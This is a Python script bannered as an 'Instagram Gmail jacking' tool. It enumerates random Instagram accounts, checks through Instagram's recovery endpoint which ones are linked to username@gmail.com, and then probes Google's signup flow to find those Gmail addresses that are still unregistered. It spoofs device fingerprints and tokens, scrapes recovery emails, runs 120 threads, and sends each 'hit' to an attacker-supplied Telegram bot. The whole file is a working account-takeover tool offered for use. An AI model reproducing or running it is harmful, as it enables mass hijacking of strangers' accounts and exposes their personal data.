import requests
import random
import threading
import os
import sys
import time
import json
import string,pyfiglet
import base64
import secrets
import httpx
import uuid
import html
import re
import hashlib
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass

try:
    import user_agent
except ImportError:
    user_agent = None

try:
    from cfonts import render
except ImportError:
    render = None

requests.packages.urllib3.disable_warnings()

_C = lambda: random.sample(['red', 'cyan', 'green', 'yellow', 'blue', 'magenta', 'white'], 2)

b1 = '\033[1;32m'
z = '\033[1;31m'
white = '\033[1;37m'
RESET = '\033[0m'
Y = '\033[93m'

IST_OFFSET = timedelta(hours=5, minutes=30)

IG_HOME          = "https://www.instagram.com/"
IG_GRAPHQL       = "https://www.instagram.com/api/graphql"
IG_PROFILE_API   = "https://i.instagram.com/api/v1/users/web_profile_info/?username="
IG_BLOKS_URL     = "https://b.i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
IG_RECOVERY_URL  = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
GOOGLE_SIGNUP    = "https://accounts.google.com/lifecycle/flows/signup"
GOOGLE_BATCH     = "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute"
TG_API           = "https://api.telegram.org/bot{}/sendMessage"
APP_ID_BLOKS     = "567067343352427"
APP_ID_GRAPHQL   = "1217981644879628"
APP_ID_WEB       = "936619743392459"
BLOKS_VERS = [
    "dda8a25b49f5003a4b5be5546bb8ca6e9435a576c4cecf6a6f245f91eacc00ad",
    "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
]

DOC_IDS = ["38611279431804694", "9310670392322965", "26672929172408668"]

IG_VERS = ["370.1.0.43.96", "375.0.0.38.107", "380.0.0.42.115", "385.0.0.36.112"]

MOBILE_UAS = [
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
]
WEB_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
]
DEVICES = [
    {"brand":"samsung","model":"SM-G973F","device":"beyond1","board":"exynos9820"},
    {"brand":"samsung","model":"SM-A536B","device":"a53x","board":"s5e8825"},
    {"brand":"samsung","model":"SM-S918B","device":"dm1q","board":"kalama"},
    {"brand":"samsung","model":"SM-S926B","device":"e2q","board":"s5e9945"},
    {"brand":"samsung","model":"SM-A546B","device":"a54x","board":"exynos1380"},
    {"brand":"samsung","model":"SM-A235F","device":"a23","board":"qcom"},
    {"brand":"Google","model":"Pixel 6","device":"raven","board":"raven"},
    {"brand":"Google","model":"Pixel 7","device":"panther","board":"panther"},
    {"brand":"Google","model":"Pixel 8","device":"shiba","board":"shiba"},
    {"brand":"Google","model":"Pixel 9","device":"tokay","board":"zuma"},
    {"brand":"Xiaomi","model":"M2102J20SG","device":"ares","board":"mt6893"},
    {"brand":"Xiaomi","model":"2201117TG","device":"veux","board":"sm6375"},
    {"brand":"Xiaomi","model":"Redmi Note 10","device":"sweet","board":"sm6150"},
    {"brand":"OnePlus","model":"ONEPLUS A6003","device":"OnePlus6","board":"sdm845"},
    {"brand":"OnePlus","model":"CPH2449","device":"OP594DL1","board":"taro"},
    {"brand":"OPPO","model":"CPH2371","device":"OP4F1F","board":"mt6893"},
    {"brand":"realme","model":"RMX3085","device":"RE568F","board":"mt6785"},
]

YEAR_RANGES = [
    (1, 5000000, 2010), (5000001, 17750000, 2011),
    (17750001, 279760000, 2012), (279760001, 900990000, 2013),
    (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
    (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
    (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
    (27238602160, 43464475395, 2020), (43464475396, 50289297647, 2021),
    (50289297648, 57464707082, 2022), (57464707083, 63313426938, 2023),
    (63313426939, 70134323896, 2024), (70134323897, 78313496938, 2025),
]

TL_RE     = re.compile(r'TL[=:]([0-9A-Za-z_\-:.]+)')
QZXIXC_RE = re.compile(r'"Qzxixc"\s*:\s*"([^"]+)"')
SNLM0E_RE = re.compile(r'"SNlM0e"\s*:\s*"([^"]+)"')
LSD_RE    = re.compile(r'"LSD",\[\],\{"token":"([^"]+)"')
CSRF_RE   = re.compile(r"csrftoken=([^;]+)")
RECOVERY_EMAIL_RE = re.compile(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}')

SEC_CH_UAS = [
    ('"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"', '?0', '"Windows"'),
    ('"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', '?0', '"Windows"'),
    ('"Chromium";v="137", "Google Chrome";v="137", "Not/A)Brand";v="24"', '?1', '"Android"'),
    ('"Chromium";v="138", "Google Chrome";v="138", "Not:A-Brand";v="24"', '?0', '"macOS"'),
]

def _fast_session():
    s = requests.Session()
    s.verify = False
    adapter = HTTPAdapter(
        pool_connections=30, pool_maxsize=30,
        max_retries=Retry(total=2, backoff_factor=0.1, status_forcelist=[500, 502, 503]),
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def md5_hex(value):
    return hashlib.md5(str(value).encode()).hexdigest()

def check_access():
    try:
        r = requests.get("https://pastebin.com/raw/jNXySMFt", timeout=6)
        if "kreji" in r.text:
            print('ok')
            return True
        else:
            print(f" {z}⛔ FILE EXPIRED {RESET}")
            return False
    except:
        print(f" {z}⛔ FILE EXPIRED {RESET}")
        return False
    
check_access()
def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    os.system('clear')
    print("\033[1;35m"+pyfiglet.figlet_format('gmail',font="slant"))
    print("\033[1;32m                                 By Crazy x aman\n")
    print("\033[1;33m🔧 INSTAGRAM GMAIL JACKING FILE ")
    print("="*50)
    print("\033[1;37m")

display_banner()
print(f" {white}Bot Token{RESET} : ", end="")
Token = input().strip()
print(f" {white}Chat ID{RESET}   : ", end="")
user_id = input().strip()
TELEGRAM_TOKEN = Token
TELEGRAM_CHAT_ID = user_id


def chuchi(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    req = requests.post(url, json=payload, timeout=15)
    if '"ok":true' in req.text:
        return 
    else:
        print(f" {z}⛔ INVALID TOKEN/ID{RESET}")
        time.sleep(1)
        exit()
    
    #print("false")
    
chuchi("🛠️ Tool Started... 🚀")

time.sleep(1)
display_banner()

id_ranges = {
    1: (1682665388, 3382665388),
    2: (2682665388, 5398785217),
    3: (5398785217, 8682665388),
    4: (7497939245, 10016232395),
    5: (10016232396, 27238602159),
    6: (27238602160, 43464475395),
    7: (43464475396, 50289297647),
    8: (50289297648, 57464707082),
    9: (2682665388, 10016232395),
}

print(f" {b1}YEAR{RESET}")
print(f" {white}1{RESET} - 2015")
print(f" {white}2{RESET} - 2016")
print(f" {white}3{RESET} - 2017")
print(f" {white}4{RESET} - 2018")
print(f" {white}5{RESET} - 2019")
print(f" {white}6{RESET} - 2020")
print(f" {white}7{RESET} - 2021")
print(f" {white}8{RESET} - 2022")
print(f" {white}9{RESET} - BEST")
print(f" {b1}Year{RESET} [1-9] : ", end="")
year_mode = int(input())

clr()


def generate_user_id():
    start, end = id_ranges.get(year_mode, id_ranges[9])
    return str(random.randrange(start, end))

generated_count = 0
hit_count = 0
invalid_gmail = 0
invalid_email = 0
thread_lock = threading.Lock()
username_cache = {}

_thread_local = threading.local()


def _get_ig_session():
    if not hasattr(_thread_local, 'ig_session'):
        _thread_local.ig_session = _fast_session()
    return _thread_local.ig_session


def _get_bloks_session():
    if not hasattr(_thread_local, 'bloks_session'):
        _thread_local.bloks_session = _fast_session()
    return _thread_local.bloks_session

_bootstrap_lock = threading.Lock()
_bootstrap_lsd = None
_bootstrap_csrf = None
_bootstrap_mid = None


def _bootstrap_ig():
    global _bootstrap_lsd, _bootstrap_csrf, _bootstrap_mid
    with _bootstrap_lock:
        if _bootstrap_lsd and _bootstrap_csrf:
            return True
    try:
        s = _fast_session()
        bloks_ver = random.choice(BLOKS_VERS)
        headers = {
            'User-Agent': random.choice(WEB_UAS),
            'x-ig-app-id': APP_ID_WEB,
            'x-bloks-version-id': bloks_ver,
            'origin': IG_HOME.rstrip('/'),
            'referer': IG_HOME,
        }
        r = s.get(IG_HOME, headers=headers, timeout=15)
        if r.status_code == 200:
            found = LSD_RE.search(r.text)
            lsd = found.group(1) if found else None
            csrf = r.cookies.get('csrftoken', '')
            mid = r.cookies.get('mid', md5_hex(uuid.uuid4().hex)[:32])
            if csrf and lsd:
                with _bootstrap_lock:
                    _bootstrap_lsd = lsd
                    _bootstrap_csrf = csrf
                    _bootstrap_mid = mid
                s.close()
                return True
        s.close()
    except:
        pass
    return False


def _refresh_bootstrap():
    while True:
        try:
            _bootstrap_ig()
        except:
            pass
        time.sleep(random.uniform(60, 120))

threading.Thread(target=_refresh_bootstrap, daemon=True).start()

def log_to_telegram(msg):
    url = TG_API.format(TELEGRAM_TOKEN)
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    for attempt in range(3):
        try:
            r = requests.post(url, json=payload, timeout=15, verify=False)
            if r.status_code == 429:
                retry_after = r.json().get("parameters", {}).get("retry_after", 2)
                time.sleep(retry_after)
                continue
            if not r.ok:
                plain_text = re.sub(r'<[^>]+>', '', msg)
                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": plain_text}, timeout=10, verify=False)
            return True
        except Exception:
            time.sleep(1)
    return False

_stat_lock = threading.Lock()
_print_lock = threading.Lock()
current_email = ""


class Stat:
    def __init__(self):
        self.run = True
        self._started = False
        self._thread = threading.Thread(target=self._loop, daemon=True)

    def start(self):
        self._thread.start()

    def _line(self):
        with _stat_lock:
            os.system('clear')
            email_display = current_email if current_email else "waiting..."
            top = f"""{b1}ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ\n HITS      :{RESET} {white}[ {hit_count} ]{RESET} \n {Y}BAD IG{RESET}    : {white}[ {invalid_email} ]{RESET} \n {z}BAD MAIL{RESET}  : {white}[ {invalid_gmail} ]{RESET} \n CHECKING  : {white}[ {email_display} ]{RESET}\n{b1}ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ\n\n{white} By @PokiePy x @idontdeserveher"""
        return top, ""

    def _loop(self):
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()
        while self.run:
            with _print_lock:
                top, _ = self._line()
                if self._started:
                    sys.stdout.write("\033[2K\r" + top + "\r")
                else:
                    sys.stdout.write(top)
                    self._started = True
                sys.stdout.flush()
            
        sys.stdout.write("\033[?25h\r\n")
        sys.stdout.flush()


st = Stat()


def display_stats(email=""):
    global current_email
    with _stat_lock:
        current_email = email


def emit(text):
    with _print_lock:
        if st._started:
            sys.stdout.write("\033[2K\r\033[1B\033[2K\r\033[1A")
        sys.stdout.write(text + "\n")
        st._started = False
        sys.stdout.flush()
        
def _gen_ig_ua():
    d = random.choice(DEVICES)
    av = random.choice(["12", "13", "14"])
    al = {"12": "31", "13": "33", "14": "34"}[av]
    dpi = random.choice(["320", "360", "394", "420", "440", "450", "480"])
    w = random.choice(["1080", "1440"])
    h = random.choice(["2207", "2340", "2400", "2560"])
    v = random.choice(IG_VERS)
    loc = random.choice(["en_US", "en_GB", "en_IN"])
    b = random.randint(600000000, 800000000)
    return f"Instagram {v} Android ({al}/{av}; {dpi}dpi; {w}x{h}; {d['brand']}; {d['model']}; {d['device']}; {d['board']}; {loc}; {b})"


def _gen_google_ua():
    if user_agent:
        return str(user_agent.generate_user_agent())
    return random.choice(WEB_UAS)


def guess_year(pk):
    try:
        pk = int(pk)
    except Exception:
        return "?"
    for low, high, y in YEAR_RANGES:
        if low <= pk <= high:
            return str(y)
    return "2023+"


def _save_hit(slip, u, email):
    try:
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"{slip}\n\n")
    except: pass


def api_headers():
    return {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "User-Agent": random.choice(WEB_UAS),
        "X-IG-App-ID": APP_ID_WEB,
        "X-Requested-With": "XMLHttpRequest",
    }

def rest_v1(username_str):
    try:
        payload = {"email_or_username": username_str, "flow": "fxcal"}
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "x-csrftoken": "missing",
            "accept-language": "en-US,en;q=0.9",
        }
        with httpx.Client(http2=True, headers=headers, timeout=10.0, verify=False) as c:
            r = c.post(IG_RECOVERY_URL, data=payload)
        raw = r.text
        if any(x in raw.lower() for x in ["no user found", "fail", "not found"]):
            return "N/A"
        ev = RECOVERY_EMAIL_RE.search(raw)
        if ev:
            return ev.group(0)
        return "N/A"
    except Exception:
        return "N/A"

def format_hit_slip(fn, u, fc, fwc, mc, ed, joined, private, rec="N/A"):
    joined_str = joined if joined else "N/A"
    private_str = "Yes" if private else "No"
    return f"""⌯ Hi bro you Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓ
folowers : {fc}
following : {fwc}
total posts : {mc}
username : {u}
email : {ed}
name : {fn}
year : {joined_str}
private : {private_str}
rest : {rec}
ᯓᯓᯓᯓᯓᯓᯓᯓ
by : @pokiePy x @idontdeserveher"""

def username():
    session = _get_ig_session()
    while True:
        try:
            uid = generate_user_id()
            doc_id = random.choice(DOC_IDS)
            bloks_ver = random.choice(BLOKS_VERS)

            with _bootstrap_lock:
                real_lsd = _bootstrap_lsd
                real_csrf = _bootstrap_csrf
                real_mid = _bootstrap_mid

            lsd_token = real_lsd or ("m" + base64.urlsafe_b64encode(secrets.token_bytes(19)).decode().rstrip("="))
            csrf = real_csrf or base64.urlsafe_b64encode(secrets.token_bytes(24)).decode().rstrip("=")

            payload = {
                'jazoest': "2" + ''.join(random.choices(string.digits, k=4)),
                'lsd': lsd_token,
                '__crn': 'comet.igweb.PolarisExploreSearchRoute',
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                'server_timestamps': 'true',
                'variables': json.dumps({
                    "enable_integrity_filters": True,
                    "id": uid,
                    "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
                    "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
                    "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
                    "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": True,
                    "__relay_internal__pv__PolarisShortDramaEnabledrelayprovider": False,
                    "__relay_internal__pv__PolarisLongformEnabledrelayprovider": False
                }, separators=(',', ':')),
                'doc_id': doc_id
            }

            sec_ch = random.choice(SEC_CH_UAS)
            headers = {
                'User-Agent': random.choice(MOBILE_UAS),
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-csrftoken': csrf,
                'x-fb-friendly-name': "PolarisProfilePageContentQuery",
                'x-ig-app-id': APP_ID_GRAPHQL,
                'x-bloks-version-id': bloks_ver,
                'x-asbd-id': str(random.randint(120000, 400000)),
                'x-fb-lsd': lsd_token,
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'sec-ch-ua': sec_ch[0],
                'sec-ch-ua-mobile': sec_ch[1],
                'sec-ch-ua-platform': sec_ch[2],
                'accept-language': "en-US",
                'priority': "u=1, i",
            }
            if real_mid:
                headers['x-mid'] = real_mid
                
            cookies = {}
            if real_csrf:
                cookies['csrftoken'] = real_csrf

            response = session.post(IG_GRAPHQL, data=payload, headers=headers, cookies=cookies, timeout=10)
            if response.status_code != 200:
                continue
            try:
                user_data = response.json().get('data', {}).get('user', {})
            except:
                continue
            username_str = user_data.get('username')
            if username_str:
                if '_' in username_str or '..' in username_str or len(username_str) < 5 or len(username_str) > 30:
                    continue
                with thread_lock:
                    global generated_count
                    generated_count += 1
                    if len(username_cache) >= 500:
                        keys = list(username_cache.keys())[:250]
                        for k in keys:
                            username_cache.pop(k, None)
                    username_cache[username_str] = user_data
                email = f"{username_str}@gmail.com"
                check_email_availability(email, username_str)
        except:
            pass

def check_email_availability(email, username_str):
    global invalid_email
    session = _get_bloks_session()
    device_id = str(uuid.uuid4())
    family_id = str(uuid.uuid4())
    android_id = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
    waterfall_id = str(uuid.uuid4())
    bloks_ver = random.choice(BLOKS_VERS)
    tid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + ":" + str(random.randint(10, 99))

    params = {
        "client_input_params": {
            "aac": json.dumps({
                "aac_init_timestamp": int(time.time()),
                "aacjid": str(uuid.uuid4()),
                "aaccs": secrets.token_urlsafe(32),
            }),
            "flash_call_permissions_status": {
                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                "READ_CALL_LOG": "DENIED",
                "ANSWER_PHONE_CALLS": "DENIED",
            },
            "search_query": email,
            "search_screen_type": "email_or_username",
            "ig_android_qe_device_id": device_id,
            "android_build_type": "release",
            "network_bssid": None,
            "zero_balance_state": None,
            "device_network_info": None,
            "cloud_trust_token": None,
            "ig_vetted_device_nonce": None,
            "encrypted_msisdn": "",
            "auth_secure_device_id": "",
            "sfdid": "",
            "headers_infra_flow_id": "",
            "text_input_id": tid,
            "was_headers_prefill_available": 0,
            "was_headers_prefill_used": 0,
            "is_oauth_without_permission": 0,
            "is_whatsapp_installed": random.choice([0, 1]),
            "fetched_email_token_list": {},
            "fetched_email_list": [],
            "ig_oauth_token": [],
            "sso_accounts_auth_data": [],
            "accounts_list": [],
            "lois_settings": {"lois_token": ""},
            "gms_incoming_call_retriever_eligibility": "client_not_supported",
        },
        "server_params": {
            "event_request_id": str(uuid.uuid4()),
            "waterfall_id": waterfall_id,
            "device_id": android_id,
            "family_device_id": family_id,
            "qe_device_id": device_id,
            "INTERNAL__latency_qpl_instance_id": random.randint(40000000000000, 60000000000000),
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "login_surface": "login_home",
            "login_entry_point": "logged_out",
            "is_from_logged_out": 0,
            "is_platform_login": 0,
            "is_from_logged_in_switcher": 0,
            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
            "access_flow_version": "pre_mt_behavior",
            "context_data": "",
            "layered_homepage_experiment_group": None,
        }
    }
    data = {
        'params': json.dumps(params, separators=(',', ':')),
        'bk_client_context': json.dumps({"bloks_version": bloks_ver, "styles_id": "instagram"}, separators=(',', ':')),
        'bloks_versioning_id': bloks_ver,
    }

    sec_ch = random.choice(SEC_CH_UAS)
    headers = {
        'accept-language': random.choice(['en-US', 'en-IN, en-US', 'en-GB,en;q=0.9']),
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-bloks-version-id': bloks_ver,
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android_id,
        'x-ig-app-id': APP_ID_BLOKS,
        'x-ig-app-locale': random.choice(['en_US', 'en_IN']),
        'x-ig-capabilities': '3brTv10=',
        'x-ig-connection-type': 'WIFI',
        'x-ig-device-id': device_id,
        'x-ig-device-locale': 'en_US',
        'x-ig-family-device-id': family_id,
        'x-ig-mapped-locale': 'en_US',
        'x-ig-timezone-offset': str(random.choice([-25200, -18000, -14400, 0, 3600, 19800, 28800])),
        'x-ig-client-endpoint': 'com.bloks.www.caa.ar.search',
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': f'{time.time():.3f}',
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-{random.choice(["0","1"])}',
        'sec-ch-ua': sec_ch[0],
        'sec-ch-ua-mobile': sec_ch[1],
        'sec-ch-ua-platform': sec_ch[2],
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': _gen_ig_ua(),
    }
    try:
        response = session.post(IG_BLOKS_URL, data=data, headers=headers, timeout=10).text
        if email in response:
            display_stats(email)
            check_gmail(email, username_str)
        else:
            with thread_lock:
                invalid_email += 1
            display_stats(email)
            with thread_lock:
                username_cache.pop(username_str, None)
    except:
        with thread_lock:
            invalid_email += 1
        display_stats(email)
        with thread_lock:
            username_cache.pop(username_str, None)

def check_gmail(email, username_str):
    global invalid_gmail, invalid_email
    session = _fast_session()
    tl = None
    at_token = None

    def get_tokens():
        nonlocal tl, at_token
        for _ in range(5):
            session.headers.clear()
            ua = _gen_google_ua()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://accounts.google.com/',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'x-browser-channel': 'stable',
                'x-browser-copyright': 'Copyright 2025 Google LLC. All rights reserved.',
                'x-browser-year': '2025',
            }
            params = {
                'biz': 'false', 'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1', 'emr': '1', 'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1', 'service': 'mail',
            }
            try:
                r = session.get(GOOGLE_SIGNUP, params=params, headers=headers, timeout=12)
                tl_m = TL_RE.search(r.url)
                qz_m = QZXIXC_RE.search(r.text)
                at_m = SNLM0E_RE.search(r.text)
                if not (tl_m and qz_m and at_m):
                    continue
                tl = tl_m.group(1)
                at_token = at_m.group(1)
                session.headers.update({
                    'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': ua,
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-goog-ext-391502476-jspb': '["' + qz_m.group(1) + '"]',
                    'x-same-domain': '1',
                })
                return True
            except:
                pass
        return False

    def signup_name():
        first = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 9)))
        last = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 7)))
        p = {'rpcids': 'E815hb', 'source-path': '/lifecycle/steps/signup/name', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
        d = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22{}%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(first, last, at_token)
        for _ in range(5):
            try:
                r = session.post(GOOGLE_BATCH, params=p, data=d, timeout=12).text
                if "steps/signup/birthdaygender" in r:
                    return True
            except:
                pass
        return False

    def signup_birthday():
        p = {'rpcids': 'eOY7Bb', 'source-path': '/lifecycle/steps/signup/birthdaygender', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
        d = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22..%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(random.randint(1990, 2006), random.randint(1, 12), random.randint(1, 28), at_token)
        for _ in range(5):
            try:
                r = session.post(GOOGLE_BATCH, params=p, data=d, timeout=12).text
                if 'steps/signup/username' in r:
                    return True
            except:
                pass
        return False
        
    email_prefix = email.split('@')[0] if '@' in email else email
    if '..' in email_prefix or '_' in email_prefix or len(email_prefix) < 5 or len(email_prefix) > 30:
        with thread_lock:
            invalid_email += 1
        display_stats(email)
        with thread_lock:
            username_cache.pop(username_str, None)
        session.close()
        return
    if not get_tokens():
        with thread_lock: invalid_gmail += 1
        with thread_lock: username_cache.pop(username_str, None)
        session.close()
        return

    if not signup_name():
        with thread_lock: invalid_gmail += 1
        with thread_lock: username_cache.pop(username_str, None)
        session.close()
        return

    if not signup_birthday():
        with thread_lock: invalid_gmail += 1
        with thread_lock: username_cache.pop(username_str, None)
        session.close()
        return
    p = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
    d = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email_prefix, at_token)
    try:
        r = session.post(GOOGLE_BATCH, params=p, data=d, timeout=12).text
        if "steps/signup/password" in r:
            with thread_lock:
                global hit_count
                hit_count += 1
            fetch_instagram_profile(username_str, username_cache.get(username_str, {}))
            with thread_lock:
                username_cache.pop(username_str, None)
        else:
            with thread_lock:
                invalid_gmail += 1
            display_stats(email)
            with thread_lock:
                username_cache.pop(username_str, None)
    except:
        with thread_lock:
            invalid_gmail += 1
        display_stats(email)
        with thread_lock:
            username_cache.pop(username_str, None)
    finally:
        session.close()

def fetch_instagram_profile(username_str, user_data):
    api_user = {}
    try:
        with httpx.Client(http2=True, headers=api_headers(), timeout=httpx.Timeout(12.0), follow_redirects=True, verify=False) as client:
            response = client.get(IG_PROFILE_API + username_str)
            if response.status_code == 200:
                data = response.json()
                api_user = data.get("user", data.get("data", {}).get("user", {})) or {}
    except: pass

    def _g(key):
        return api_user.get(key) or user_data.get(key)

    followers_count = _g('follower_count') or (api_user.get('edge_followed_by') or {}).get('count') or 0
    following_count = _g('following_count') or (api_user.get('edge_follow') or {}).get('count') or 0
    posts_count = (
        _g('media_count')
        or (api_user.get('edge_owner_to_timeline_media') or {}).get('count')
        or user_data.get('all_media_count')
        or 0
    )
    full_name = _g('full_name') or 'N/A'
    user_id_val = api_user.get('id') or user_data.get('id') or user_data.get('pk', 'N/A')
    is_private = _g('is_private') or False

    safe_name = html.escape(str(full_name))
    safe_username = html.escape(str(username_str))
    email_domain = "gmail.com"
    recovery = rest_v1(username_str)

    slip = format_hit_slip(
        fn=safe_name, u=safe_username,
        fc=followers_count, fwc=following_count, mc=posts_count,
        ed=f"{safe_username}@{email_domain}",
        joined=guess_year(user_id_val),
        private=is_private, rec=recovery,
    )
    emit(slip)
    log_to_telegram(slip)
    _save_hit(slip, username_str, f"{username_str}@{email_domain}")

def worker():
    while True:
        username()


if __name__ == "__main__":
    
    _bootstrap_ig()
    st.start()
    display_stats()
    try:
        with ThreadPoolExecutor(max_workers=120) as pool:
            for _ in range(120):
                pool.submit(worker)
    except KeyboardInterrupt:
        st.run = False
        sys.stdout.write("\033[?25h\r\n")
        sys.stdout.flush()
        sys.exit(0)
